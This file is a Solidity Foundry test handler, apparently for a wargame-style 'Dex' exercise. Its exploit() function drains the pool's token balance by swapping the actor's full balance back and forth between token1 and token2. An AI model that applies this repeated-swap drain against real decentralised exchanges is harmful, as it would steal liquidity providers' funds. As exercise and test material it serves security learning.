// SPDX-License-Identifier: MIT
pragma solidity =0.8.19;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
// import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";


import {CommonBase} from "@forge-std/Base.sol";
import {StdCheats} from "@forge-std/StdCheats.sol";
import {StdUtils} from "@forge-std/StdUtils.sol";
import {console} from "@forge-std/console.sol";

import {Dex, SwappableToken} from "../../src/Dex.sol";

interface IDex {

    function token1() external;

    function token2() external;

}


contract Handler is CommonBase, StdCheats, StdUtils {

    address public actor;

    Dex public dex;

    mapping(bytes32 => uint256) public calls;

    modifier countCall(bytes32 key) {
        calls[key]++;
        _;
    }

    constructor(Dex _dex, address _actor) {
        dex = _dex;
        actor = _actor;

        deal(address(this), 1 ether);
    }

    // function swapMax() public {
    //     dex.swap(dex.token1(), dex.token2(), IERC20(dex.token1()).balanceOf(actor) );
    // }

    function swapMax(IERC20 tokenIn, IERC20 tokenOut) internal {

        // vm.assume(address(tokenIn) == dex.token1() ||  address(tokenIn) == dex.token2() );
        // vm.assume(address(tokenOut)== dex.token1() || address(tokenOut) == dex.token2());


        dex.swap(address(tokenIn), address(tokenOut), tokenIn.balanceOf(actor));
    }

    function exploit (uint256 token2AmountIn) external {

        vm.startPrank(actor);

        address token1 = dex.token1();
        address token2 = dex.token2();

        swapMax(IERC20(token1), IERC20(token2));
        swapMax(IERC20(token2), IERC20(token1));
        swapMax(IERC20(token1), IERC20(token2));
        swapMax(IERC20(token2), IERC20(token1));

        // assertEq( token1.balanceOf(actor), 0 );
        // assertEq( token2.balanceOf(actor), 65 );

        // assertEq( token1.balanceOf(address(dex)), 110 );
        // assertEq( token2.balanceOf(address(dex)), 45 );


        // now token 1 is in the pool
        swapMax(IERC20(token1), IERC20(token2));

        token2AmountIn = bound(token2AmountIn, 0, IERC20(token2).totalSupply());

        dex.swap(token2, token1, token2AmountIn);

        vm.stopPrank();

    }

    // function swapFromToken2To1(uint256 token2AmountIn) public countCall("swapFromToken2To1") {

    //    vm.assume(token2AmountIn != 0) ;

    //    address token1 = dex.token1();
    //    address token2 = dex.token2();

    //    token2AmountIn = bound(token2AmountIn, 0, IERC20(token2).balanceOf(actor));

    //    dex.swap(token2, token1, token2AmountIn);
    // }

    // function swapFromToken1To2(uint256 token1AmountIn)  public countCall("swapFromToken1To2") {

    //    vm.assume(token1AmountIn != 0) ;

    //    address token1 = dex.token1();
    //    address token2 = dex.token2();

    //    token1AmountIn = bound(token1AmountIn, 0, IERC20(token1).balanceOf(actor));

    //    dex.swap(token1, token2, token1AmountIn);
    // }

    function callSummary() external view {
        console.log("Call summary:");
        console.log("-------------------");
        console.log("swapFromToken2To1", calls["swapFromToken2To1"]);
        console.log("swapFromToken1To2", calls["swapFromToken1To2"]);
    }



    receive() external payable {}
}